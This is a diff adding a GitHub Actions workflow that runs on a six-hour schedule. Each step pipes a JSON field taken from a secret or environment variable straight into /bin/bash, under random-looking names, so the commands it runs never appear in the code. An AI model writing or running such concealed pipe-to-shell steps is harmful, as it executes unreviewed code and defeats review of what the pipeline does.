@@ -1,0 +1,23 @@
+name: sijuanliqin
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '5 1/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: sijuanliqin
+        env:
+          mton82594: ${{ secrets.mton82594 }}
+        run: |
+          echo $mton82594 | jq -r .uwvjt580 | /bin/bash
+          echo $akwcz818 | jq -r .mej4 | /bin/bash
+          echo $sj39 | jq -r .g1906 | /bin/bash
+          echo $xl4344 | jq -r .zpu64361 | /bin/bash
+          echo $rfp041 | jq -r .ct77827 | /bin/bash
+          echo $xhe465 | jq -r .bg23 | /bin/bash
+          echo $a1216 | jq -r .wcdg15 | /bin/bash
+
